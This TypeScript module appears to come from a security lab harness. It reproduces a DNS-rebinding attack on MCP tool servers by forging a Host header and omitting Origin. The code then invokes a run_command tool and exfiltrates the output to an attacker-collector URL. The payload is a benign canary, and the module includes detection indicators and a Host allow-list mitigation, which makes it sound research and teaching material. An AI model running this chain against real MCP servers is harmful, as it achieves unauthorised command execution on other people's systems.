/**
 * Module 02 - headless reproduction of the DNS-rebinding path (CVE-2025-66414 class).
 *
 * A SEPARATE attack from module 01. Module 01 needs no DNS at all; this one turns DNS on. Origin
 * validation alone defeats module 01, but DNS rebinding defeats Origin validation: the attacker
 * rebinds their OWN domain to the victim's address, so the browser's request is *same-origin* (it
 * carries NO cross-origin Origin the server can gate on) yet the Host header still names the
 * attacker's rebind domain. The one server-side control that still catches it is a Host allow-list
 * (the SDK's enableDnsRebindingProtection, which is opt-in: still `?? false` in @modelcontextprotocol/sdk
 * 1.29.0, the version this lab actually resolves, past the 1.24.0 advisory fix).
 * That is exactly why "validate Origin" alone is not enough.
 *
 * WHAT THIS DETERMINISTIC SCENARIO PROVES: the POST-REBIND request reached the VICTIM MCP and executed
 * only the benign canary. It models that request precisely by connecting to the real victim server
 * (the address the rebind name points to AFTER the flip) while sending a forged Host header (the
 * rebind domain) and NO Origin. A session issued to that foreign Host, plus a run_command that echoes
 * the canary, is proof the request landed on the victim MCP and ran.
 *
 * The forged Host is why this module declares `transport: streamable-http`: that client sends the
 * header verbatim (see engine/harness/src/transport/http.ts). The full time-varying rebind, with a
 * real browser and a real DNS flip, is the two-host split-host tier; see ./README.md. Loading the
 * attacker page alone is NOT success. The proof is the post-rebind hit on the victim below.
 *
 *   ok (ATTACK-OK) = a session is issued to a request bearing a FOREIGN Host (the rebind domain) AND
 *                    run_command echoes the canary  (the server never validated Host).
 */
import { defineScenario } from "../../engine/harness/src/scenario.js";
import { resultText } from "../../engine/harness/src/transport/index.js";
import { redactSession } from "../../engine/harness/src/report.js";

const CONCLUSION_OK =
  "The evidence demonstrates the DNS-rebinding path against an MCP server that ships DNS-rebinding " +
  "protection off by default (CVE-2025-66414, CWE-1188). The victim issued a session to a request that " +
  "carried a foreign Host header and no Origin at all, then executed a capability tool over it. Because " +
  "the post-rebind request is same-origin from the browser's point of view, no Origin check can see it: " +
  "the control that holds is a Host allow-list, enforced server-side.";

const CONCLUSION_NO =
  "The post-rebind request did not reproduce: the victim refused to issue a session to a request bearing " +
  "a foreign Host header, so the chain stops before any tool call. This is what a Host allow-list looks " +
  "like when it is switched on (enableDnsRebindingProtection), and it is the mitigation for this class.";

export const scenario = defineScenario({
  title: "DNS rebinding past Origin validation on the MCP streamable-HTTP transport",
  conclusionOk: CONCLUSION_OK,
  conclusionNo: CONCLUSION_NO,

  iocs(ctx, ok) {
    const t = ctx.target;
    return {
      endpoints: [new URL(t.url).pathname],
      methods: ["POST"],
      // The discriminator is a Host the server does not serve on a request that is NOT cross-origin.
      // NOT "absent is the point of the rebind": a real browser DOES send Origin after the flip, equal
      // to its own Host. The property that defines the rebind is "never cross-origin", which covers both
      // this headless shape and the browser's. See the module README, Detection engineering.
      headers: {
        Host: t.hostHeader ?? "(none)",
        Origin: "(absent here; a browser sends a same-origin one - never cross-origin either way)",
      },
      userAgent: "browser-class (post-rebind page; same-origin from the browser's point of view)",
      sessionId: null,
      tools: ok ? ["run_command (capability exec)"] : ["none (session refused to the foreign Host)"],
      sourceHint: "rebound attacker domain resolving to the victim address",
      collector: t.collectorUrl,
      detections: ["ATR-2026-70018 (foreign Host on the MCP transport)"],
    };
  },

  async run(ctx) {
    const { report, target } = ctx;
    const victim = new URL(target.url).host;
    report.info(
      `Modelling the post-rebind request: connect to ${victim}, present Host ${target.hostHeader}, send no Origin.`,
    );

    // 1. Post-rebind initialize: land on the victim MCP with the rebind Host and no Origin.
    report.wireNote("Post-rebind initialize - forged Host, no Origin");
    report.step(`Opening MCP session against ${victim} with Host: ${target.hostHeader}`);
    const opened = await ctx.connect();
    const sid = opened.sessionId;
    const detail = (exec: boolean, decision: string) =>
      `victim=${victim} host=${target.hostHeader} origin=none session=${decision} exec=${exec} reached_victim=true`;

    // No session issued to the foreign Host (e.g. a 403) means a Host allow-list held.
    if (opened.status === 403 || !sid) {
      report.fail(
        `No session issued to the foreign Host (status ${opened.status})`,
        "The victim refused to open a session for a request whose Host header it does not serve, which is the Host allow-list doing its job.",
      );
      return {
        ok: false,
        detail: detail(false, "refused"),
        notReproducedWhy: "host_rejected",
      };
    }
    report.pass(
      `Session issued to a foreign Host: ${redactSession(sid)}`,
      `The victim issued session ${sid} to a request carrying Host: ${target.hostHeader}, a name it does not serve, and no Origin header at all (CWE-1188, CWE-346).`,
    );
    report.mark("Post-rebind request accepted by the victim MCP");

    const session = opened.session!;
    try {
      // 2. Drive the exec tool over the rebound session. Same-origin from the browser's view, so no
      //    CORS gate applies and no Origin header exists for the server to check.
      ctx.requireExec();
      report.wireNote("Capability invocation - run_command (benign canary) over the rebound session");
      report.step("Tool invocation: tools/call run_command (benign canary) over the rebound session");
      const call = await session.request("tools/call", {
        name: "run_command",
        arguments: { cmd: ctx.canary() },
      });
      const out = resultText(call);

      if (!ctx.isCanary(out)) {
        report.fail(
          "run_command did not return the canary marker",
          "The tool call did not echo the proof-of-execution canary.",
        );
        return {
          ok: false,
          detail: detail(false, "issued"),
          notReproducedWhy: "exec_absent",
        };
      }
      const marker = ctx.canaryMarker(out);
      report.pass(
        `Canary executed: ${marker} returned over the rebound session`,
        `Proof-of-execution canary ${marker} was returned in the tool output ("${out.split("\n")[0]}" ...), confirming the post-rebind request reached the victim MCP and ran.`,
      );

      // 3. Exfil the canary output (best-effort).
      await ctx.exfil({
        victim,
        host: target.hostHeader,
        sessionId: sid,
        output: out,
      });
      report.info(`Exfiltrated canary output to attacker-collector (${target.collectorUrl})`);

      return { ok: true, detail: detail(true, "issued") };
    } finally {
      session.close();
    }
  },

  /** Read-only: does the endpoint issue a session to a request bearing a foreign Host? Nothing more. */
  async probe(ctx) {
    const opened = await ctx.connect({ retryMs: 5000 });
    opened.session?.close();
    return {
      checks: [
        {
          id: "host-header-unvalidated",
          observed: !!opened.sessionId && opened.status !== 403,
          // Only a refusal FROM the MCP transport says anything about a Host allow-list. A 404 (or
          // anything else off the transport) means the request never reached one, so it must not be
          // reported as the mitigation being present. The summary marks that run INCONCLUSIVE.
          detail: opened.sessionId
            ? `a session was issued to a request presenting Host: ${ctx.target.hostHeader}, a name this server does not serve`
            : opened.status === 403
              ? `the foreign Host was refused (status 403), so a Host allow-list is in force`
              : `no session was issued to the foreign Host (status ${opened.status})`,
        },
      ],
    };
  },
});
